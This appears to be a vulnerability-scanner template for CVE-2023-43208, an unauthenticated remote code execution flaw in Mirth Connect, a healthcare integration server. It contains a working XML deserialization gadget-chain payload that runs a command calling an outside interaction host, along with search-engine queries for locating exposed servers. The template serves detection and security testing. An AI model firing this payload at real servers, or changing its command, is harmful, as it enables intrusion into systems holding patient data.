http:
- extractors:
  - group: 1
    internal: true
    name: version
    part: body_1
    regex:
    - (.*)
    type: regex
  matchers:
  - condition: and
    dsl:
    - compare_versions(version, "<4.4.1")
    - contains(interactsh_protocol, "dns")
    - status_code_1 == 200 && status_code_2 == 500
    type: dsl
  raw:
  - 'GET /api/server/version HTTP/1.1

    Host: {{Hostname}}

    X-Requested-With: OpenAPI

    '
  - "POST /api/users HTTP/1.1\nHost: {{Hostname}}\nX-Requested-With: OpenAPI\nContent-Type:\
    \ application/xml\n\n<sorted-set>\n  <string>abcd</string>\n  <dynamic-proxy>\n\
    \    <interface>java.lang.Comparable</interface>\n    <handler class=\"org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler\"\
    >\n      <target class=\"org.apache.commons.collections4.functors.ChainedTransformer\"\
    >\n        <iTransformers>\n          <org.apache.commons.collections4.functors.ConstantTransformer>\n\
    \            <iConstant class=\"java-class\">java.lang.Runtime</iConstant>\n \
    \         </org.apache.commons.collections4.functors.ConstantTransformer>\n  \
    \        <org.apache.commons.collections4.functors.InvokerTransformer>\n     \
    \       <iMethodName>getMethod</iMethodName>\n            <iParamTypes>\n    \
    \          <java-class>java.lang.String</java-class>\n              <java-class>[Ljava.lang.Class;</java-class>\n\
    \            </iParamTypes>\n            <iArgs>\n              <string>getRuntime</string>\n\
    \              <java-class-array/>\n            </iArgs>\n          </org.apache.commons.collections4.functors.InvokerTransformer>\n\
    \          <org.apache.commons.collections4.functors.InvokerTransformer>\n   \
    \         <iMethodName>invoke</iMethodName>\n            <iParamTypes>\n     \
    \         <java-class>java.lang.Object</java-class>\n              <java-class>[Ljava.lang.Object;</java-class>\n\
    \            </iParamTypes>\n            <iArgs>\n              <null/>\n    \
    \          <object-array/>\n            </iArgs>\n          </org.apache.commons.collections4.functors.InvokerTransformer>\n\
    \          <org.apache.commons.collections4.functors.InvokerTransformer>\n   \
    \         <iMethodName>exec</iMethodName>\n            <iParamTypes>\n       \
    \       <java-class>java.lang.String</java-class>\n            </iParamTypes>\n\
    \            <iArgs>\n              <string>nslookup {{interactsh-url}}</string>\n\
    \            </iArgs>\n          </org.apache.commons.collections4.functors.InvokerTransformer>\n\
    \        </iTransformers>\n      </target>\n      <methodName>transform</methodName>\n\
    \      <eventTypes>\n        <string>compareTo</string>\n      </eventTypes>\n\
    \    </handler>\n  </dynamic-proxy>\n</sorted-set>\n"
id: CVE-2023-43208
info:
  author: princechaddha
  classification:
    cpe: cpe:2.3:a:nextgen:mirth_connect:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-43208
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    epss-percentile: 0.99975
    epss-score: 0.94416
  description: Unauthenticated remote code execution vulnerability in NextGen Healthcare
    Mirth Connect before version 4.4.1.
  impact: 'Successful exploitation could result in unauthorized access and potential
    compromise of sensitive data.

    '
  metadata:
    fofa-query: title="mirth connect administrator"
    google-query: intitle:"mirth connect administrator"
    max-request: 2
    product: mirth_connect
    shodan-query:
    - title:"mirth connect administrator"
    - http.title:"mirth connect administrator"
    vendor: nextgen
  name: NextGen Healthcare Mirth Connect - Remote Code Execution
  reference:
  - http://packetstormsecurity.com/files/176920/Mirth-Connect-4.4.0-Remote-Command-Execution.html
  - https://github.com/nvn1729/advisories
  remediation: 'Apply the vendor-supplied patch or upgrade to a non-vulnerable version.

    '
  severity: critical
  tags: packetstorm,cve,cve2023,nextgen,rce,kev,vkev,vuln
